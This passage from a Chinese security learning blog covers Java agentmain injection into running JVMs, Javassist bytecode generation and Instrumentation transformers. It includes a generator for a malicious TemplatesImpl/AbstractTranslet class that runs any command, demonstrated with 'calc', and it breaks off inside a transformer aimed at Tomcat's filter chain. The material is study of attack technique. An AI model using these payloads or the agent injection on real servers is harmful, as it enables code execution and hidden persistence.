&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>同时配置 agentmain.mf 文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Agent-Class: agent.AgentMain</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分别对上面的 java 文件进行编译，然后利用命令行进行打包</p>
<p>这样我们的 AgentMain.jar 就成功生成了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jar cvfm AgentMain.jar agentmain.mf AgentMain.<span class="keyword">class</span> <span class="title class_">Sleep_Hello</span>.class </span><br></pre></td></tr></table></figure>

<p>接下来我们去编写测试类Inject_Agent，可以将agent注入到正在运行的JVM中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Agent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentInitializationException &#123;</span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        String path=<span class="string">&quot;E:\\Code\\java\\AgentMem\\src\\main\\java\\agent\\AgentMain.jar&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class="line">            System.out.println(vmd.displayName());</span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().contains(<span class="string">&quot;Sleep&quot;</span>))&#123;</span><br><span class="line">                <span class="comment">//连接指定JVM</span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());</span><br><span class="line">                <span class="comment">//加载Agent</span></span><br><span class="line">                virtualMachine.loadAgent(path);</span><br><span class="line">                <span class="comment">//断开JVM连接</span></span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先运行<code>Sleep_Hello</code>，然后执行Inject_Agent，可以看到执行效果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751458046397-0fa4868d-7976-4794-b1ec-937dce3878c5.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751458046397-0fa4868d-7976-4794-b1ec-937dce3878c5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>不过由于 tools.jar 并不会在 JVM 启动的时候默认加载，所以这里利用 URLClassloader 来加载我们的 tools.jar</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestAgentMain</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            java.io.<span class="type">File</span> <span class="variable">toolsPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.File(System.getProperty(<span class="string">&quot;java.home&quot;</span>).replace(<span class="string">&quot;jre&quot;</span>,<span class="string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="string">&quot;tools.jar&quot;</span>);</span><br><span class="line">            System.out.println(toolsPath.toURI().toURL());</span><br><span class="line">            java.net.<span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> toolsPath.toURI().toURL();</span><br><span class="line">            java.net.<span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.net.URLClassLoader(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[]&#123;url&#125;);</span><br><span class="line">            Class&lt;?&gt; MyVirtualMachine = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">            Class&lt;?&gt; MyVirtualMachineDescriptor = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">listMethod</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;list&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            java.util.List&lt;Object&gt; list = (java.util.List&lt;Object&gt;) listMethod.invoke(MyVirtualMachine,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;Running JVM Start..&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> list.get(i);</span><br><span class="line">                java.lang.reflect.<span class="type">Method</span> <span class="variable">displayName</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;displayName&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) displayName.invoke(o,<span class="literal">null</span>);</span><br><span class="line">                System.out.println(name);</span><br><span class="line">                <span class="keyword">if</span> (name.contains(<span class="string">&quot;TestAgentMain&quot;</span>))&#123;</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">getId</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;id&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    java.lang.<span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> (java.lang.String) getId.invoke(o,<span class="literal">null</span>);</span><br><span class="line">                    System.out.println(<span class="string">&quot;id &gt;&gt;&gt; &quot;</span> + id);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">attach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;java.lang.String.class&#125;);</span><br><span class="line">                    java.lang.<span class="type">Object</span> <span class="variable">vm</span> <span class="operator">=</span> attach.invoke(o,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;id&#125;);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">loadAgent</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;java.lang.String.class&#125;);</span><br><span class="line">                    java.lang.<span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;AgentMain.jar的路径&quot;</span>;</span><br><span class="line">                    loadAgent.invoke(vm,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;path&#125;);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">detach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;detach&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    detach.invoke(vm,<span class="literal">null</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="TdTrW">动态修改字节码</h2>
我们可以看到在实现 premain方法 的时候，我们除了能获取到 agentArgs 参数，还可以获取 Instrumentation 实例，那么 Instrumentation 实例是什么，在此之前我们先去了解一下Javassist（当时在生成字节码时就用它，但是一直没有知道怎么用）

<h3 id="BfDp5">Javassist</h3>
<h4 id="HNb9l">简介</h4>
Java 字节码以二进制的形式存储在 .class 文件中，每一个.class文件包含一个Java类或接口。Javaassist 就是一个用来处理Java字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以通过手动的方式去生成一个新的类对象。其使用方式类似于反射。

<h5 id="Kulae">ClassPool</h5>
`ClassPool`是`CtClass`对象的容器。`CtClass`对象必须从该对象获得。如果调用此对象的`get()`方法，则它将搜索表示的各种源`ClassPath` 以查找类文件，然后创建一个`CtClass`表示该类文件的对象。创建的对象将返回给调用者。可以将其理解为一个存放`CtClass`对象的容器。

<p>获得方法如下：</p>
<p>通过<code>ClassPool.getDefault()</code>使用JVM的类搜索路径。如果程序运行在JBoss或者Tomcat的Web服务器上，则ClassPool可能无法找到用户的类，因为Web会服务器使用多个类加载器作为系统类加载器。在这种情况下，ClassPool必须添加额外的搜索路径</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获得方法</span></span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">cp</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="comment">//添加类搜索路径</span></span><br><span class="line">cp.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(&lt;Class&gt;));</span><br></pre></td></tr></table></figure>

<h5 id="HYjj2">CtClass</h5>
可以将CtClass理解成加强版的Class对象，我们可以通过CtClass对目标类进行各种操作。可以通过以下代码获取

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPool.get(ClassName)</span><br></pre></td></tr></table></figure>

<h5 id="MZvA9">CtMethod</h5>
同理我们可以将其理解为加强版的Method对象。通过`CtClass.getDeclaredMethod(MethodName)`获取，其中该类提供了一些方法可以让我们直接修改方法体，方法如下。

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">CtMethod</span> <span class="keyword">extends</span> <span class="title class_">CtBehavior</span> &#123;</span><br><span class="line">    <span class="comment">// 主要的内容都在父类 CtBehavior 中</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 父类 CtBehavior</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">CtBehavior</span> <span class="keyword">extends</span> <span class="title class_">CtMember</span> &#123;</span><br><span class="line">    <span class="comment">// 设置方法体</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBody</span><span class="params">(String src)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 插入在方法体最前面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertBefore</span><span class="params">(String src)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 插入在方法体最后面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertAfter</span><span class="params">(String src)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 在方法体的某一行插入内容</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">insertAt</span><span class="params">(<span class="type">int</span> lineNum, String src)</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中传递给<code>insertBefore</code>、<code>insertAfter</code>和<code>insertAt</code>的String对象是由<code>Javassist</code>的编译器进行编译的。该编译器支持语言的扩展，以下以$符号开头的几个标识符具有特殊的含义：</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751449993613-b8a782b9-3e28-4a7f-aa8e-2d60e8bb1ce9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751449993613-b8a782b9-3e28-4a7f-aa8e-2d60e8bb1ce9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="fIwDQ">Javassist使用Demo</h4>
pom.xml中导入以下依赖

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">  &lt;groupId&gt;org.javassist&lt;/groupId&gt;  </span><br><span class="line">  &lt;artifactId&gt;javassist&lt;/artifactId&gt;  </span><br><span class="line">  &lt;version&gt;<span class="number">3.27</span><span class="number">.0</span>-GA&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>创建我们的测试类，用javassist创建一个Person类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavassistDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">CreatePerson</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//获取CtClass对象容器ClassPool</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//创建一个新类 Javassist.Learning.Person</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;javassist.Person&quot;</span>);</span><br><span class="line">        <span class="comment">//创建一个Person类的属性name</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">ctField1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(classPool.get(<span class="string">&quot;java.lang.String&quot;</span>),<span class="string">&quot;name&quot;</span>, ctClass);</span><br><span class="line">        <span class="comment">//设置属性访问符</span></span><br><span class="line">        ctField1.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        <span class="comment">//将属性添加到Person中，并设置初始值</span></span><br><span class="line">        ctClass.addField(ctField1,CtField.Initializer.constant(<span class="string">&quot;Sean&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//向Person类中添加setter和getter方法</span></span><br><span class="line">        ctClass.addMethod(CtNewMethod.setter(<span class="string">&quot;setName&quot;</span>,ctField1));</span><br><span class="line">        ctClass.addMethod(CtNewMethod.getter(<span class="string">&quot;getName&quot;</span>,ctField1));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个无参构造</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">        <span class="comment">//设置方法体</span></span><br><span class="line">        ctConstructor.setBody(<span class="string">&quot;&#123;name = \&quot;Sean\&quot;;&#125;&quot;</span>);</span><br><span class="line">        <span class="comment">//向Person类中添加无参构造</span></span><br><span class="line">        ctClass.addConstructor(ctConstructor);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个类方法printName</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtMethod</span>(CtClass.voidType, <span class="string">&quot;printName&quot;</span>, <span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">        <span class="comment">//设置方法访问符</span></span><br><span class="line">        ctMethod.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        <span class="comment">//设置方法体</span></span><br><span class="line">        ctMethod.setBody(<span class="string">&quot;&#123;System.out.println(\&quot;Hello World\&quot;);&#125;&quot;</span>);</span><br><span class="line">        <span class="comment">//将方法添加至Person中</span></span><br><span class="line">        ctClass.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将生成的字节码写入文件中</span></span><br><span class="line">        ctClass.writeFile();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        CreatePerson();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>生成person.class文件，反编译后如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> javassist;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Sean&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String var1)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = <span class="string">&quot;Sean&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们可以利用javassist来生成一个恶意的.class类，在我们之前打链子时，会使用该方法生成恶意class类的字节码，当时直接使用的师傅们的代码，自己并不清楚（好像有减少payload长度的效果）</p>
<h4 id="UmOGg">使用Javassist生成恶意class</h4>
在我们CC的学习中，利用动态加载字节码进行代码执行时，我们的恶意类需要继承`AbstractTranslet`类，并且充血两个`transform`方法。否则编译会无法通过，无法生成我们的class文件

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">createClass</span>  <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shell</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>该恶意类在执行的过程中并没有用到重写的方法，因此我们可以直接使用Javassist从字节码层面来生成恶意class，跳过恶意类的编译过程。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">createClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            ctConstructor.setBody(<span class="string">&quot;try&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;            Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        &#125;catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.detach();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeShell</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">byte</span>[] shell = createClass.getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;Sean.class&quot;</span>));</span><br><span class="line">            fileOutputStream.write(shell);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[]args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            writeShell();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>保存出来的恶意文件如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var1) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="nSQF6">Instrumentation</h3>
Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果

<p>在 Instrumentation 中增加了名叫 transformer 的 Class 文件转换器，转换器可以改变二进制流的数据。Transformer 可以对未加载的类进行拦截，同时可对已加载的类进行重新拦截，所以根据这个特性我们能够实现动态修改字节码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除一个类转换器</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断目标类是否能够修改。</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取目标已经加载的类。</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Instrumentation 提供了 addTransformer，getAllLoadedClasses，retransformClasses 等方法，由于我们后面只用到了这三个，所以就只去介绍这三个</p>
<h4 id="RjaCt">方法介绍</h4>
<h5 id="t8Sk4">addTransformer</h5>
addTransformer方法用来注册Transformer，因此我们可以通过编写ClassFileTransformer接口实现类来注册自己的Transformer

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注册提供的转换器</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span><br></pre></td></tr></table></figure>

<p>当类进行加载时，会进入到我们自己的Transformer中的transform函数进行拦截</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain,<span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line"></span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span> , <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(className.equals(ClassName))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Got it!!!&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(ClassName);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> 